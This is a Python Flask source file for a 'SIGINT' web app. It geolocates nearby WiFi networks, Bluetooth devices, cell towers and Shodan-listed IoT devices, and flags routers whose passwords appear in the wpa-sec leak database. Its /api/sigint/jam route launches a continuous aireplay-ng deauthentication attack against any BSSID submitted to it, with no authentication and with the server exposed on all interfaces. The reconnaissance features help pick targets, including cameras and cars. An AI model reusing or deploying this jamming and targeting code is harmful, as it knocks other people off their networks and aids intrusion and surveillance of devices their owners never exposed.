import random
import subprocess
import requests
import os
from flask import Flask, request, jsonify, render_template
from hashlib import sha1

app = Flask(__name__)

# ─── API Keys from environment (set in .env or docker-compose) ───────────────
WIGLE_API_NAME    = os.getenv("WIGLE_API_NAME")
WIGLE_API_TOKEN   = os.getenv("WIGLE_API_TOKEN")
OPENCELLID_API_KEY = os.getenv("OPENCELLID_API_KEY")
SHODAN_API_KEY    = os.getenv("SHODAN_API_KEY")

# ─── Fallback dummy data (used ONLY when all real APIs fail) ─────────────────
DUMMY_DATA = [
    {"lat": 51.505, "lon": -0.09,  "ssid": "TestWiFi",  "bssid": "00:14:22:01:23:45", "vendor": "Generic",    "signal": -65, "accuracy": 50,  "timestamp": "2025-04-11T10:00:00Z", "type": "router"},
    {"lat": 51.507, "lon": -0.09,  "ssid": "TestWiFi2", "bssid": "00:14:22:01:23:46", "vendor": "Generic",    "signal": -65, "accuracy": 60,  "timestamp": "2025-04-11T10:00:00Z", "type": "router", "leaked": True},
    {"lat": 51.506, "lon": -0.088, "cell_id": "123456789", "vendor": "N/A",           "signal": -70, "accuracy": 100, "timestamp": "2025-04-11T10:01:00Z", "type": "cell_tower"},
    {"lat": 51.504, "lon": -0.091, "ip": "192.168.1.100", "vendor": "CameraCorp",    "type": "camera"}
]

# ─── Device classifier ────────────────────────────────────────────────────────
def classify_device(name, original_type):
    if not name:
        return original_type
    n = name.upper()
    if any(k in n for k in ["CAR","FORD","TOYOTA","BMW","TESLA","SYNC","MAZDA","HONDA","UCONNECT","HYUNDAI","LEXUS","NISSAN"]):
        return "car"
    if any(k in n for k in ["TV","BRAVIA","VIZIO","SAMSUNG","LG","ROKU","FIRE","SMARTVIEW","KDL-"]):
        return "tv"
    if any(k in n for k in ["HEADPHONE","EARBUD","BOSE","SONY","BEATS","AUDIO","AIRPOD","JBL","SENNHEISER"]):
        return "headphone"
    if any(k in n for k in ["DASHCAM","DASH CAM","DVR","70MAI","VIOFO","GARMIN DASH"]):
        return "dashcam"
    if any(k in n for k in ["CAM","SURVEILLANCE","SECURITY","NEST","RING","ARLO","HIKVISION","DAHUA","REOLINK"]):
        return "camera"
    if any(k in n for k in ["WATCH","FITBIT","GARMIN","WHOOP"]):
        return "iot"
    return original_type

# ─── WPA-SEC k-anonymity leaked password check ────────────────────────────────
def wpasec_kquery(devices):
    if not isinstance(devices, list):
        return devices
    clids = set()
    try:
        for d in devices:
            if d.get('type') == 'router' and d.get('bssid') and d.get('ssid'):
                bssid = d['bssid'].replace(':', '').replace('-', '').lower()
                if len(bssid) != 12 or not all(c in "0123456789abcdef" for c in bssid):
                    continue
                ssid = d['ssid'].encode('utf-8').hex()
                d['hash'] = sha1(f"{bssid}{ssid}".encode("ascii")).hexdigest()
                clids.add(d['hash'][:4])

        wpasec_response = requests.post(
            'https://wpa-sec.stanev.org/bmacssid',
            data=list(clids),
            timeout=5
        )
        if wpasec_response.status_code == 200:
            wpasec_json = wpasec_response.json()
            for d in devices:
                if 'hash' not in d:
                    continue
                suffixes = wpasec_json.get(d['hash'][:4])
                if not suffixes:
                    continue
                for s in suffixes:
                    if d['hash'].endswith(s):
                        d['leaked'] = True
                        break
    except Exception as e:
        print(f"wpa-sec kquery exception: {str(e)}")
    return devices

# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route('/')
@app.route('/map-w')
def wifi_map():
    return render_template('wifi-search.html')

@app.route('/nearby')
def nearby():
    lat = request.args.get('lat', type=float)
    lon = request.args.get('lon', type=float)
    mode = request.args.get('mode', 'wifi')

    if not lat or not lon:
        return jsonify({"error": "Missing coordinates"}), 400

    devices = []

    if mode == 'bluetooth':
        if WIGLE_API_NAME and WIGLE_API_TOKEN:
            try:
                r = requests.get(
                    'https://api.wigle.net/api/v2/bluetooth/search',
                    params={'latrange1': lat-0.01, 'latrange2': lat+0.01,
                            'longrange1': lon-0.01, 'longrange2': lon+0.01},
                    auth=(WIGLE_API_NAME, WIGLE_API_TOKEN), timeout=8
                )
                if r.status_code == 200:
                    for device in r.json().get('results', []):
                        name = device.get('name') or device.get('netid')
                        t = classify_device(name, "bluetooth")
                        devices.append({
                            "lat": device.get('trilat'), "lon": device.get('trilong'),
                            "ssid": name, "bssid": device.get('netid'),
                            "vendor": device.get('type') or t.replace('_',' ').title(),
                            "signal": device.get('level'), "timestamp": device.get('lastupdt'),
                            "type": t
                        })
                else:
                    print(f"Wigle BT error: {r.status_code}")
            except Exception as e:
                print(f"Wigle BT exception: {e}")
        else:
            print("Wigle API key not configured — skipping bluetooth API call")
    else:
        # WiFi via Wigle
        if WIGLE_API_NAME and WIGLE_API_TOKEN:
            try:
                r = requests.get(
                    'https://api.wigle.net/api/v2/network/search',
                    params={'latrange1': lat-0.01, 'latrange2': lat+0.01,
                            'longrange1': lon-0.01, 'longrange2': lon+0.01},
                    auth=(WIGLE_API_NAME, WIGLE_API_TOKEN), timeout=8
                )
                if r.status_code == 200:
                    for network in r.json().get('results', []):
                        name = network.get('ssid')
                        devices.append({
                            "lat": network.get('trilat'), "lon": network.get('trilong'),
                            "ssid": name, "bssid": network.get('netid'),
                            "vendor": network.get('vendor'), "signal": network.get('level'),
                            "timestamp": network.get('lastupdt'),
                            "type": classify_device(name, "router")
                        })
                    devices = wpasec_kquery(devices)
                else:
                    print(f"Wigle error: {r.status_code}")
            except Exception as e:
                print(f"Wigle exception: {e}")
        else:
            print("Wigle API key not configured — skipping WiFi API call")

        # Cell towers via OpenCellID
        if OPENCELLID_API_KEY:
            try:
                r = requests.get(
                    'https://us1.unwiredlabs.com/v2/process.php',
                    json={"token": OPENCELLID_API_KEY, "lat": lat, "lon": lon, "address": 0},
                    timeout=8
                )
                if r.status_code == 200:
                    data = r.json()
                    if data.get('status') == 'ok':
                        for cell in data.get('cells', []):
                            devices.append({
                                "lat": cell.get('lat'), "lon": cell.get('lon'),
                                "cell_id": str(cell.get('cellid')),
                                "signal": cell.get('signal'), "accuracy": cell.get('accuracy'),
                                "timestamp": cell.get('updated'), "type": "cell_tower"
                            })
            except Exception as e:
                print(f"OpenCellID exception: {e}")
        else:
            print("OpenCellID API key not configured — skipping cell tower lookup")

        # IoT devices via Shodan
        if SHODAN_API_KEY:
            try:
                r = requests.get(
                    'https://api.shodan.io/shodan/host/search',
                    params={'key': SHODAN_API_KEY, 'query': f'geo:{lat},{lon},1', 'limit': 5},
                    timeout=8
                )
                if r.status_code == 200:
                    for banner in r.json().get('matches', []):
                        info = banner.get('data', '')
                        devices.append({
                            "lat": banner['location']['latitude'],
                            "lon": banner['location']['longitude'],
                            "ip": banner['ip_str'], "info": info[:50],
                            "type": classify_device(info, "iot_device")
                        })
            except Exception as e:
                print(f"Shodan exception: {e}")

    if not devices:
        print(f"All APIs unavailable — using dummy fallback for mode={mode}")
        if mode == 'bluetooth':
            devices = [
                {"lat": lat+random.uniform(-0.002,0.002), "lon": lon+random.uniform(-0.002,0.002), "ssid": "Tesla Model 3",      "type": "car",       "vendor": "Tesla Motors",     "note": "dummy"},
                {"lat": lat+random.uniform(-0.002,0.002), "lon": lon+random.uniform(-0.002,0.002), "ssid": "Sony WH-1000XM4",    "type": "headphone", "vendor": "Sony Corp.",       "note": "dummy"},
                {"lat": lat+random.uniform(-0.002,0.002), "lon": lon+random.uniform(-0.002,0.002), "ssid": "Samsung QLED 75",    "type": "tv",        "vendor": "Samsung Elec.",    "note": "dummy"},
                {"lat": lat+random.uniform(-0.002,0.002), "lon": lon+random.uniform(-0.002,0.002), "ssid": "Hidden_BT_Tracker",  "type": "bluetooth", "vendor": "Unknown",          "note": "dummy"}
            ]
        else:
            devices = [
                {"lat": lat+random.uniform(-0.001,0.001), "lon": lon+random.uniform(-0.001,0.001), "ssid": "CYBER_ROUTER_A1",  "type": "router",     "vendor": "Cisco Systems", "note": "dummy"},
                {"lat": lat+random.uniform(-0.001,0.001), "lon": lon+random.uniform(-0.001,0.001), "ssid": "DASHCAM_V3",       "type": "camera",     "vendor": "Nextbase",      "note": "dummy"},
                {"lat": lat+random.uniform(-0.001,0.001), "lon": lon+random.uniform(-0.001,0.001), "ssid": "5G_TOWER_B4",      "type": "cell_tower", "vendor": "Ericsson",      "note": "dummy"}
            ]

    return jsonify({"devices": devices})


# ─── SIGINT: Real WiFi Scanner (nmcli or iwlist) ──────────────────────────────
@app.route('/api/sigint/scan', methods=['GET'])
def sigint_scan():
    aps = []

    # Try nmcli first (modern Linux)
    for cmd, parser in [
        (['nmcli', '-t', '-f', 'SSID,BSSID,CHAN,SIGNAL,SECURITY', 'dev', 'wifi', 'list'], 'nmcli'),
        (['iwlist', 'wlan0', 'scan'], 'iwlist'),
    ]:
        try:
            output = subprocess.check_output(cmd, encoding='utf-8', stderr=subprocess.DEVNULL, timeout=10)
            if parser == 'nmcli':
                for line in output.strip().split('\n'):
                    parts = line.split(':')
                    if len(parts) >= 5:
                        aps.append({
                            "id": parts[1],
                            "ssid": parts[0] or "<HIDDEN>",
                            "bssid": parts[1].replace('\\', ':'),
                            "channel": int(parts[2]) if parts[2].isdigit() else 0,
                            "signal": int(parts[3]) if parts[3].lstrip('-').isdigit() else 0,
                            "encryption": "WPA2" if "WPA2" in parts[4] else ("WPA" if "WPA" in parts[4] else "OPEN"),
                            "vendor": "Real_Node",
                            "source": "nmcli"
                        })
            elif parser == 'iwlist':
                # Basic iwlist parsing
                current = {}
                for line in output.split('\n'):
                    line = line.strip()
                    if 'Cell' in line and 'Address:' in line:
                        if current:
                            aps.append(current)
                        current = {"id": line.split('Address:')[-1].strip(), "bssid": line.split('Address:')[-1].strip(), "source": "iwlist"}
                    elif 'ESSID:' in line:
                        current['ssid'] = line.split('"')[1] if '"' in line else ''
                    elif 'Channel:' in line:
                        current['channel'] = int(line.split(':')[-1]) if line.split(':')[-1].isdigit() else 0
                    elif 'Signal level=' in line:
                        try:
                            current['signal'] = int(line.split('Signal level=')[-1].split(' ')[0].split('/')[0])
                        except:
                            current['signal'] = 0
                    elif 'Encryption key:' in line:
                        current['encryption'] = "WPA2" if 'on' in line else "OPEN"
                if current:
                    aps.append(current)
            if aps:
                break
        except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired) as e:
            print(f"[sigint/scan] {cmd[0]} failed: {e}")
            continue

    if not aps:
        print("[sigint/scan] No real WiFi scanner available in container — returning simulation")
        aps = [
            {"id": "S1", "ssid": "ALFA_CAPTURED_NET", "bssid": "A0:B1:C2:D3:E4:F5", "channel": 6,  "signal": -32, "encryption": "WPA2", "vendor": "Alfa_Link",  "note": "simulation"},
            {"id": "S2", "ssid": "TARGET_AP_5GHz",    "bssid": "B1:C2:D3:E4:F5:A0", "channel": 36, "signal": -54, "encryption": "WPA2", "vendor": "TP-Link",    "note": "simulation"},
            {"id": "S3", "ssid": "OPEN_HOTSPOT",       "bssid": "C2:D3:E4:F5:A0:B1", "channel": 1,  "signal": -71, "encryption": "OPEN",  "vendor": "Unknown",    "note": "simulation"},
        ]

    return jsonify({"aps": aps, "interface": os.getenv("WIFI_INTERFACE", "wlan0"), "status": "scanning"})


# ─── SIGINT: Bluetooth Real Scan (hcitool / bluetoothctl) ────────────────────
@app.route('/api/sigint/bluetooth', methods=['GET'])
def sigint_bluetooth():
    devices = []

    for cmd in [
        ['bluetoothctl', 'scan', 'on'],   # modern
        ['hcitool', 'scan', '--flush'],    # classic
    ]:
        try:
            output = subprocess.check_output(
                cmd, encoding='utf-8', stderr=subprocess.DEVNULL, timeout=12
            )
            for line in output.strip().split('\n'):
                parts = line.strip().split('\t')
                if len(parts) >= 2:
                    devices.append({
                        "addr": parts[0].strip(),
                        "name": parts[1].strip() if len(parts) > 1 else "Unknown",
                        "rssi": None,
                        "type": "bluetooth",
                        "source": cmd[0]
                    })
            if devices:
                break
        except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired) as e:
            print(f"[sigint/bluetooth] {cmd[0]} failed: {e}")
            continue

    if not devices:
        print("[sigint/bluetooth] No Bluetooth adapter available — returning simulation")
        devices = [
            {"name": "Laptop_BT_Node",  "rssi": -58, "addr": "DE:AD:BE:EF:01:01", "type": "bluetooth", "note": "simulation"},
            {"name": "Bose QC45",       "rssi": -72, "addr": "00:11:22:33:44:55", "type": "headphone",  "note": "simulation"},
            {"name": "Samsung_TV_BT",   "rssi": -80, "addr": "11:22:33:44:55:66", "type": "tv",         "note": "simulation"},
        ]

    return jsonify({"devices": devices})


# ─── SIGINT: WiFi Jamming (aireplay-ng deauth) ────────────────────────────────
@app.route('/api/sigint/jam', methods=['POST'])
def sigint_jam():
    data = request.json or {}
    target_bssid = data.get('bssid')
    intensity = data.get('intensity', 50)
    action = data.get('action', 'start')
    interface = os.getenv("WIFI_INTERFACE", "wlan0mon")

    if not target_bssid:
        return jsonify({"error": "Missing target BSSID"}), 400

    if action == 'start':
        try:
            # Enable monitor mode first if needed
            subprocess.run(['airmon-ng', 'start', interface.replace('mon', '')],
                           capture_output=True, timeout=5)
            # Launch deauth attack in background
            proc = subprocess.Popen(
                ['aireplay-ng', '--deauth', '0', '-a', target_bssid, interface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            return jsonify({
                "status": "JAMMING_ACTIVE",
                "target": target_bssid,
                "intensity": intensity,
                "interface": interface,
                "pid": proc.pid,
                "real": True
            })
        except FileNotFoundError:
            # aireplay-ng not available — container doesn't have aircrack-ng
            return jsonify({
                "status": "JAMMING_SIMULATED",
                "target": target_bssid,
                "intensity": intensity,
                "interface": interface,
                "real": False,
                "reason": "aireplay-ng not installed in container (needs aircrack-ng suite + monitor-mode WiFi adapter)"
            })
        except Exception as e:
            return jsonify({"status": "ERROR", "error": str(e)}), 500
    else:
        try:
            subprocess.run(['pkill', 'aireplay-ng'], capture_output=True)
            return jsonify({"status": "JAMMING_CEASED", "real": True})
        except Exception as e:
            return jsonify({"status": "JAMMING_CEASED", "real": False, "note": str(e)})


# ─── Geo: Cell Towers (OpenCellID) ───────────────────────────────────────────
@app.route('/api/geo/towers')
def get_towers():
    try:
        lat = request.args.get('lat', type=float) or 51.505
        lon = request.args.get('lon', type=float) or -0.09
        bbox = f"{lat-0.05},{lon-0.05},{lat+0.05},{lon+0.05}"

        if not OPENCELLID_API_KEY:
            return jsonify({"error": "OPENCELLID_API_KEY not configured"}), 503

        r = requests.get('http://opencellid.org/cell/getInArea',
                         params={"key": OPENCELLID_API_KEY, "BBOX": bbox, "format": "json"},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            cells = data.get('cells', []) if isinstance(data, dict) else data
            towers = [{"id": str(c.get('cellid','?')), "lat": float(c.get('lat')), "lon": float(c.get('lon')),
                       "lac": c.get('lac',0), "mcc": c.get('mcc',0), "mnc": c.get('mnc',0),
                       "signal": c.get('signal',0), "radio": c.get('radio','gsm')} for c in (cells if isinstance(cells,list) else [])]
            return jsonify(towers)
        return jsonify({"error": f"Upstream API: {r.status_code}", "details": r.text[:100]}), 502
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/geo/celltower')
def get_celltower_click():
    try:
        lat = request.args.get('lat', type=float)
        lon = request.args.get('lon', type=float)
        if not lat or not lon:
            return jsonify({"error": "Missing coordinates"}), 400
        bbox = f"{lon-0.01},{lat-0.01},{lon+0.01},{lat+0.01}"
        r = requests.get('https://www.opencellid.org/ajax/getCells.php', params={"bbox": bbox}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            features = data.get('features', []) if isinstance(data, dict) else []
            towers = []
            for f in features:
                props = f.get('properties', {})
                coords = f.get('geometry', {}).get('coordinates', [0, 0])
                towers.append({"id": str(props.get('cellid', props.get('unit','?'))),
                               "lat": float(coords[1]), "lon": float(coords[0]),
                               "lac": props.get('area',0), "mcc": props.get('mcc',0),
                               "mnc": props.get('net',0), "signal": props.get('samples',0),
                               "radio": props.get('radio','gsm')})
            return jsonify(towers)
        return jsonify({"error": f"Upstream API: {r.status_code}"}), 502
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ─── Search ───────────────────────────────────────────────────────────────────
@app.route('/searchzz')
def search():
    search_type = request.args.get('type')
    query = request.args.get('query')
    if not search_type or not query:
        return jsonify({"error": "Missing search parameters"}), 400

    devices = []
    lat, lon = None, None

    if search_type == 'location':
        try:
            lat, lon = map(float, query.split(','))
        except:
            return jsonify({"error": "Invalid location format"})

        if WIGLE_API_NAME and WIGLE_API_TOKEN:
            try:
                r = requests.get('https://api.wigle.net/api/v2/network/search',
                                 params={'latrange1': lat-0.01, 'latrange2': lat+0.01,
                                         'longrange1': lon-0.01, 'longrange2': lon+0.01},
                                 auth=(WIGLE_API_NAME, WIGLE_API_TOKEN), timeout=8)
                if r.status_code == 200:
                    for n in r.json().get('results', []):
                        devices.append({"lat": n.get('trilat'), "lon": n.get('trilong'),
                                        "ssid": n.get('ssid'), "bssid": n.get('netid'),
                                        "vendor": n.get('vendor'), "signal": n.get('level'),
                                        "timestamp": n.get('lastupdt'), "type": "router"})
                    devices = wpasec_kquery(devices)
            except Exception as e:
                print(f"Wigle location exception: {e}")

        if OPENCELLID_API_KEY:
            try:
                r = requests.get('https://us1.unwiredlabs.com/v2/process.php',
                                 json={"token": OPENCELLID_API_KEY, "lat": lat, "lon": lon, "address": 0},
                                 timeout=8)
                if r.status_code == 200:
                    data = r.json()
                    if data.get('status') == 'ok':
                        for c in data.get('cells', []):
                            devices.append({"lat": c.get('lat'), "lon": c.get('lon'),
                                            "cell_id": str(c.get('cellid')), "signal": c.get('signal'),
                                            "accuracy": c.get('accuracy'), "timestamp": c.get('updated'),
                                            "type": "cell_tower"})
            except Exception as e:
                print(f"OpenCellID exception: {e}")

    elif search_type == 'bssid' and WIGLE_API_NAME:
        try:
            r = requests.get('https://api.wigle.net/api/v2/network/search',
                             params={'netid': query}, auth=(WIGLE_API_NAME, WIGLE_API_TOKEN), timeout=8)
            if r.status_code == 200:
                for n in r.json().get('results', []):
                    devices.append({"lat": n.get('trilat'), "lon": n.get('trilong'),
                                    "ssid": n.get('ssid'), "bssid": n.get('netid'),
                                    "vendor": n.get('vendor'), "signal": n.get('level'),
                                    "timestamp": n.get('lastupdt'), "type": "router"})
                devices = wpasec_kquery(devices)
        except Exception as e:
            print(f"Wigle BSSID exception: {e}")

    elif search_type == 'ssid' and WIGLE_API_NAME:
        try:
            r = requests.get('https://api.wigle.net/api/v2/network/search',
                             params={'ssid': query}, auth=(WIGLE_API_NAME, WIGLE_API_TOKEN), timeout=8)
            if r.status_code == 200:
                for n in r.json().get('results', []):
                    devices.append({"lat": n.get('trilat'), "lon": n.get('trilong'),
                                    "ssid": n.get('ssid'), "bssid": n.get('netid'),
                                    "vendor": n.get('vendor'), "signal": n.get('level'),
                                    "timestamp": n.get('lastupdt'), "type": "router"})
                devices = wpasec_kquery(devices)
        except Exception as e:
            print(f"Wigle SSID exception: {e}")

    elif search_type == 'network' and SHODAN_API_KEY:
        try:
            r = requests.get('https://api.shodan.io/shodan/host/search',
                             params={'key': SHODAN_API_KEY, 'query': query}, timeout=8)
            if r.status_code == 200:
                for h in r.json().get('matches', []):
                    devices.append({"lat": h.get('location',{}).get('latitude'),
                                    "lon": h.get('location',{}).get('longitude'),
                                    "ip": h.get('ip_str'), "vendor": h.get('org'),
                                    "type": h.get('product','iot')})
        except Exception as e:
            print(f"Shodan exception: {e}")

    if not devices:
        devices = DUMMY_DATA
        print("[search] All APIs unavailable or unconfigured — returning dummy data")

    return jsonify({"devices": devices})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
